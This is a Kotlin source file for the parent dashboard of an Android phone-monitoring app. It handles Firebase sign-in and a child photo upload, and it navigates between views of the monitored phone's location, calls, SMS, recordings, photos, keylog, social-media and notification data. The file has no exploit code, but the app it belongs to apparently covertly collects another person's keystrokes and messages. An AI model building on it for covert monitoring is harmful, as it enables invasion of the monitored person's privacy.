package com.dtz.netservice.ui.activities.mainparent

import android.content.Context
import androidx.core.net.toUri
import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentManager
import cn.pedant.SweetAlert.SweetAlertDialog
import com.dtz.netservice.R
import com.dtz.netservice.preference.DataSharePreference.childPhoto
import com.dtz.netservice.preference.DataSharePreference.timeFinishApp
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.ui.activities.base.BaseInteractor
import com.dtz.netservice.utils.MyCountDownTimer
import com.google.firebase.database.DatabaseReference
import com.google.firebase.storage.StorageReference
import com.dtz.netservice.ui.fragments.base.IOnFragmentListener
import com.dtz.netservice.ui.fragments.calls.CallsFragment
import com.dtz.netservice.ui.fragments.keylog.KeysFragment
import com.dtz.netservice.ui.fragments.maps.MapsFragment
import com.dtz.netservice.ui.fragments.message.MessageFragment
import com.dtz.netservice.ui.fragments.notifications.NotifyMessageFragment
import com.dtz.netservice.ui.fragments.photo.PhotoFragment
import com.dtz.netservice.ui.fragments.recording.RecordingFragment
import com.dtz.netservice.ui.fragments.setting.SettingFragment
import com.dtz.netservice.ui.fragments.social.SocialFragment
import com.dtz.netservice.utils.Consts.CHILD_PHOTO
import com.dtz.netservice.utils.Consts.DATA
import com.google.firebase.auth.FirebaseUser
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 9/03/18.
 */
class InteractorMainParent<V : InterfaceViewMainParent> @Inject constructor(supportFragment: FragmentManager, context: Context, firebase: InterfaceFirebase) : BaseInteractor<V>(supportFragment, context, firebase), InterfaceInteractorMainParent<V> {

    private var startTime = (1 * 60 * getContext().timeFinishApp).toLong()
    private var interval = (1 * 1000).toLong()
    private var myCountDownTimer: MyCountDownTimer?=null
    private var alertDialog: SweetAlertDialog? = null
    private var fragmentPrevious : Fragment?=null

    override fun initializeCountDownTimer() {
        myCountDownTimer = MyCountDownTimer(startTime, interval) { if (getView()!=null) getView()!!.onFinishCount() }
    }

    override fun startCountDownTimer() {
        if (myCountDownTimer!=null) myCountDownTimer?.start()
    }

    override fun restartCountDownTimer() {
        if (myCountDownTimer!=null){
            myCountDownTimer?.cancel()
            myCountDownTimer?.start()
        }
    }

    override fun cancelCountDownTimer() {
        if (myCountDownTimer!=null) myCountDownTimer?.cancel()
    }

    override fun getDatabaseReference(child: String): DatabaseReference = firebase().getDatabaseReference(child)

    override fun getStorageReference(child: String): StorageReference = firebase().getStorageReference(child)

    override fun getUser(): FirebaseUser? = firebase().getUser()

    override fun signOut() {
        if (getView()!=null) getView()!!.clearDisposable()
        cancelCountDownTimer()
        firebase().signOut()
        if (firebase().getUser() == null) getView()!!.signOutView()
    }

    override fun valueAccounts(firstTime: Boolean) {
        getView()!!.addDisposable(firebase().valueEventAccount()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .doOnSubscribe { if (isNullView() && firstTime) getView()!!.showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.get_childs,null,null){ show() } }
                .subscribe({if (isNullView()) getView()!!.setDataAccounts(it)},{ if (isNullView()) getView()!!.failedResult(it) }))
    }

    override fun uploadPhotoChild(photo: File) {
        getView()!!.addDisposable(firebase().putFile("$CHILD_PHOTO/${photo.toUri().lastPathSegment}",photo.toUri()){
            if (alertDialog!=null) alertDialog!!.titleText = "${getContext().getString(R.string.upload_photo_child)} $it%" }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .doOnSubscribe { if (isNullView()) { alertDialog = getView()!!.showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.upload_photo_child,null,null){ show() } } }
                .subscribe({ task ->
                    task.storage.downloadUrl.addOnCompleteListener {
                        val url = it.result.toString()
                        getContext().childPhoto = url
                        getDatabaseReference("$DATA/$CHILD_PHOTO").setValue(url)
                        if (isNullView()) getView()!!.successResult(true)
                    }.addOnFailureListener { if (isNullView()) getView()!!.failedResult(it) }
                },{ if (isNullView()) getView()!!.failedResult(it) }))
    }

    override fun setFragmentLocation() {
        setCheckedNavigation(R.id.nav_location)
        setFragment(MapsFragment(),MapsFragment.TAG)
    }

    override fun setFragmentCalls() {
        setCheckedNavigation(R.id.nav_calls)
        setFragment(CallsFragment(),CallsFragment.TAG)
    }

    override fun setFragmentSms() {
        setCheckedNavigation(R.id.nav_messages)
        setFragment(MessageFragment(),MessageFragment.TAG)
    }

    override fun setFragmentRecords() {
        setCheckedNavigation(R.id.nav_records)
        setFragment(RecordingFragment(),RecordingFragment.TAG)
    }

    override fun setFragmentPhotos() {
        setCheckedNavigation(R.id.nav_photographic)
        setFragment(PhotoFragment(),PhotoFragment.TAG)
    }

    override fun setFragmentKeylog() {
        setCheckedNavigation(R.id.nav_keylog)
        setFragment(KeysFragment(),KeysFragment.TAG)
    }

    override fun setFragmentSocial() {
        setCheckedNavigation(R.id.nav_social)
        setFragment(SocialFragment(),SocialFragment.TAG)
    }

    override fun setFragmentNotifyMessage() {
        setCheckedNavigation(R.id.nav_notifications)
        setFragment(NotifyMessageFragment(),NotifyMessageFragment.TAG)
    }

    override fun setFragmentSetting() {
        setCheckedNavigation(R.id.nav_setting)
        setFragment(SettingFragment(),SettingFragment.TAG)
    }

    override fun setFragmentAbout() {

    }

    private fun setCheckedNavigation(itemId:Int){
        if (isNullView()) {
            getView()?.requestApplyInsets()
            getView()?.setCheckedNavigationItem(itemId)
        }
    }

    private fun setFragment(fragment: Fragment, fragmentTag:String){
        val manager = getSupportFragmentManager()
        val trans = manager.beginTransaction()
        trans.setCustomAnimations(R.anim.fade_in,R.anim.fade_out)
        val fragmentIsAdd = manager.findFragmentByTag(fragmentTag)
        if (fragmentIsAdd!=null){
            for (i in 0 until manager.fragments.size) {
                val f = manager.fragments[i]
                if (f != fragmentIsAdd) trans.hide(manager.fragments[i])
                (f as? IOnFragmentListener)?.onHideFragment()
            }
            trans.show(fragmentIsAdd)
        }else{
            if(fragmentPrevious!=null) (fragmentPrevious as? IOnFragmentListener)?.onHideFragment()
            fragmentPrevious = fragment
            trans.disallowAddToBackStack()
            trans.add(R.id.frame_main,fragment,fragmentTag)
        }
        trans.commit()
    }
}

